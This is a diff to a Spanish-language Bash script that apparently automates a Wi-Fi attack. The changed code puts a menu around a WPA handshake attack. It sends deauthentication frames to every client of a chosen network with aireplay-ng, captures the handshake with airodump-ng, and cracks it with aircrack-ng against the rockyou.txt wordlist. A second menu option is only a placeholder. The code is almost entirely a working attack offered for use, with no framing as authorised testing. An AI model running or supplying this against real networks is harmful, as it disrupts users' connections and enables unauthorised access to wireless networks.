@@ -55,39 +55,65 @@ if [ $airtest -eq 0 ] && [ $xtermtest -eq 0 ] && [ $macctest -eq 0 ]; then
 				read -p "[?] Quieres hacer un ataque? [Y/N]: " rps
 					$cleancolor
 					if [ "$rps" == "Y" ] || [ "$rps" == "y" ]; then
-						xterm -hold -e "airodump-ng ${tar}mon" &
-						airodump_xterm_PID=$!
-						echo -e "$grayColour"
-						read -p "[?] Que red deseas atacar?: " ap
-						read -p "[?] En que canal esta ${ap}?: " channel
-						$cleancolor
-						echo -e "${greenColour}[*] Se esta desautenticando a los usuarios de la red"
-						$cleancolor
-						kill -9 $airodump_xterm_PID
-						wait $airodump_xterm_PID 2>/dev/null
+						while true; do
+							clear
+							echo -e "${grayColour}\n[+] Menu de ataque\n"
+							sleep 1
+							echo -e "${blueColour}[+] Targeta de Red:${tar}mon" 
+							echo -e "${blueColour}[+] Direccion MAC: $(macchanger --show eth0 | grep "Current MAC" | awk '{print $3}')"
+							echo -e "${blueColour}[+] Direccion IP: $(ifconfig ${tar}mon | grep "inet " | awk '{print $2}')"
+							echo -e "${yellowColour}\n1) Ataque Handshake"
+							echo -e "2) Ataque PKMID"
+							echo -e "4) Salir"
+							echo -e "${greenColour}"; read -p "Selecciona una opción: " opcion
+							$cleancolor
+							case $opcion in
+								1)
+								xterm -hold -e "airodump-ng ${tar}mon" &
+								airodump_xterm_PID=$!
+								echo -e "$grayColour"
+								read -p "[?] Que red deseas atacar?: " ap
+								read -p "[?] En que canal esta ${ap}?: " channel
+								$cleancolor
+								echo -e "${greenColour}[*] Se esta desautenticando a los usuarios de la red"
+								$cleancolor
+								kill -9 $airodump_xterm_PID
+								wait $airodump_xterm_PID 2>/dev/null
 
-						xterm -hold -e "airodump-ng -c $channel -w Handshake --essid $ap ${tar}mon" &
-						airodump_filter_xterm_PID=$?
+								xterm -hold -e "airodump-ng -c $channel -w Handshake --essid $ap ${tar}mon" &
+								airodump_filter_xterm_PID=$?
 
-						sleep 5; xterm -hold -e "aireplay-ng -0 10 -e $ap -c FF:FF:FF:FF:FF:FF ${tar}mon" &								
-						aireplay_xterm_PID=$!
-						sleep 10; kill -9 $aireplay_xterm_PID; wait $aireplay_xterm_PID 2>/dev/null
+								sleep 5; xterm -hold -e "aireplay-ng -0 10 -e $ap -c FF:FF:FF:FF:FF:FF ${tar}mon" &								
+								aireplay_xterm_PID=$!
+								sleep 10; kill -9 $aireplay_xterm_PID; wait $aireplay_xterm_PID 2>/dev/null
 
-						echo -e "${redColour}\n[%] Esperando Handshake\n"
-						$cleancolor
-						
-						sleep 10
-						echo -e "\n${yellowColour}[*] Ruta de rockyou.txt: /usr/share/wordlists/rockyou.txt"
-						read -p "[?] Ruta del Diccionario al usar: " dicc
-						$cleancolor
-						xterm -hold -e "aircrack-ng -w $dicc Handshake-01.cap"
+								echo -e "${redColour}\n[%] Esperando Handshake\n"
+								$cleancolor
+								
+								sleep 10
+								echo -e "\n${yellowColour}[*] Ruta de rockyou.txt: /usr/share/wordlists/rockyou.txt"
+								read -p "[?] Ruta del Diccionario al usar: " dicc
+								$cleancolor
+								xterm -hold -e "aircrack-ng -w $dicc Handshake-01.cap"
 
-						echo -e "\n${redColour}[*] Saliendo y reiniciando la tarjeta de red...\n" 
-						airmon-ng stop ${tar}mon > /dev/null 2>&1
-						sudo /etc/init.d/networking start > /dev/null 2>&1
-						sudo /etc/init.d/networking restart > /dev/null 2>&1
-						ifconfig $tar up > /dev/null 2>&1
-						exit
+								echo -e "\n${redColour}[*] Saliendo y reiniciando la tarjeta de red...\n" 
+								airmon-ng stop ${tar}mon > /dev/null 2>&1
+								sudo /etc/init.d/networking start > /dev/null 2>&1
+								sudo /etc/init.d/networking restart > /dev/null 2>&1
+								ifconfig $tar up > /dev/null 2>&1
+								exit
+								;;
+								2)
+								echo "Prueba"
+								;;
+								4)
+								break
+								;;
+								*)
+								echo "Opción inválida"
+								;;
+							esac
+							done
 					fi
 				if [ "$rps" == "N" ] || [ "$rps" == "n" ]; then
 					echo -e "${redColour}\n[!] Saliendo"
